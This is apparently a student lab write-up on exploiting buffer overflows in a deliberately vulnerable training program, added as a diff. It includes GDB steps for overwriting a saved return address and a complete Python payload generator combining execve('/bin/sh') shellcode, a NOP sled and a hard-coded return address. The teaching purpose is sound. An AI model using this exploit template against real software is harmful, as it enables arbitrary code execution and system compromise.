@@ -1,0 +1,105 @@
+#lang pollen
+
+◊; TODO: give explanation of project
+
+# Project 9 - Buffer Overflow
+
+## Part A
+
+In order to get to the vulnerable function with GDB, I first ran the program
+with `gdb overflow`. After that, I performed the following steps:
+
+  * Set a break point in `main` with `break main`
+  * Run the program with `run`
+  * Use `disassemble vulnerable` in order to get the address of the
+    `vulnerable` function, `0x0000555555555179`
+  * Get the address of the saved `rip` (`0x7fffffffddd8`) with `info frame`
+  * Set the saved `rip` to the address of `vulnerable` with
+    `set {void *}0x7fffffffddd8 = 0x0000555555555179`
+  * Run the rest of the program with `continue`
+
+Interestingly, this correctly jumped to the `vulnerable` function, but it would
+produce a segmentation fault when it ran `system(IMPORTANT)`. In order to see
+if I could find where the problem was, I did the following:
+
+  * Created a seperate version of the code that called `vulnerable`. This code
+    ran as expected and opened up a shell, indicating that the
+    `system(IMPORTANT)` works correctly when called normally.
+  * Ran the modified code with GDB, setting break points and stepping through
+    the code one line at a time. This still worked correctly, indicating that
+    GDB wasn't interfering with the system call.
+  * Ran the original call up until the `system(IMPORTANT)` call, then ran the
+    command `call system(IMPORTANT)`. This correctly opened up a shell, which
+    would seem to indicate that there isn't a problem with the stack or
+    registers, unless I don't understand how the `call` command works.
+  * Examined the line of code where it segfaults in `system.c`:
+    ```c
+    ret = __posix_spawn (&pid, SHELL_PATH, 0, &spawn_attr,
+		         (char *const[]){ (char *) SHELL_NAME, // <-- Error indicated here
+		          		  (char *) "-c",
+		          		  (char *) line, NULL },
+		         __environ);
+    ```
+    Unfortunately, this didn't give me much information, since I'm not as
+    familiar with the `glibc` library.
+
+Finally, I decided to try jumping directly to the setup for the
+`system(INFORMATION)` call at `0x000055555555518c`, rather than the beginning
+of the function. Surprisingly, this worked! I'm not sure why there was a
+difference, other than the fact that the setup for the `vulnerable` function or
+`puts` may have messed with the stack in some way. This would be an interesting
+point of further research.
+
+![A failed attempt at opening a shell](failed-shell.png)
+
+![A successful attempt at opening a shell](successful-shell.png)
+
+
+## Part B
+
+![Providing input to overflow the buffer and rewrite the return address](successful-input.png)
+
+
+## Part C
+
+The following code is `makepayload` used in running shellcode with 
+
+```bash
+./overflow2 `./makepayload 120`
+```
+
+```python
+#!/usr/bin/env python3
+import sys
+
+#machine code to execve("/bin/sh", NULL, NULL)  from https://www.exploit-db.com/exploits/46907
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+#the target address we want to jump to (beginning, approximately, of nameBuffer) in LE format
+#YOU NEED TO MAKE THIS BE THE ADDRESS OF nameBuffer, approximately
+target = b'\x50\xdd\xff\xff\xff\x7f'
+
+#how many bytes we need to include in our payload to get 'target' written over main's saved $RIP
+#YOU HAVE TO FIND THE RIGHT OFFSET HERE
+stackspot=int(sys.argv[1])
+
+#how big a noop sled we want
+#YOU MIGHT NEED TO TWEAK THIS
+sledsize = 16
+sled = b'\x90'*sledsize
+
+#some ASCII chars to fill out the buffer
+stuff = b'A' * (stackspot - len(shellcode) - len(sled))
+
+#  for this attack, the buffer looks like this:
+#  noop-sled || shellcode || stuff || target-written-over-saved-eip
+
+payload = sled + shellcode + stuff + target
+
+# write binary string to stdout raw
+sys.stdout.buffer.write(payload)
+```
+
+![Successful shellcode execution](successful-shellcode.png)
+
+
